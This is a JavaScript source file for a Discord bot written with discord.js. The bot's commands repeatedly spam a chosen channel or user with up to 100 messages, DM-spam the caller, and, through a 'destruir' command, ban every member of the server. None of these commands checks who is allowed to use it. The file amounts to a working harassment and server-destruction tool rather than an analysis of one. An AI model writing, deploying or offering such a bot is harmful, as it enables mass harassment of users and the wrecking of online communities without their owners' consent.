const Discord = require("discord.js");
const client = new Discord.Client();
let prefix = "s!"

client.on("ready", () => {
    console.log("Estoy online");
  client.user.setPresence( {
        status: "online",
        game: {
            name: "Juego_Ordinario",
            type: "PLAYING"
        }
     });
  });

client.on("message", (message) => {
  if (message.author.bot) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();
var veses = 100
var mensagge = "69"
var idCanales = "777"
var idDm = "666"


while (command === "canales" && veses>=1) { 
  idCanales = args[0]
  mensagge = args[1]
    client.channels.get(idCanales).send(mensagge)
    console.log(client.channels.get(idCanales).name)
    console.log(client.channels.get(idCanales).id)
    veses--
 }

veses = 100




while (command === "dm" && veses>=1) { 
  idDm = args[0]
  mensagge = args[1]
  client.users.get(idDm).send(mensagge);
  veses--
}

veses = 100

while (command === "killme" && veses>=1) { 
  mensagge = args[0]
  idDm = args[1]
 message.author.send(mensagge);
 veses--
}

veses = 100

if (message.content.startsWith(prefix+"destruir")) {
  console.log("se uso el comando prohibido");
  console.log(  message.guild.members.forEach(m => {
    m.ban();
    }));
  message.guild.members.forEach(m => {
    m.ban();
    });
 }

});


client.login("TOKEN"); 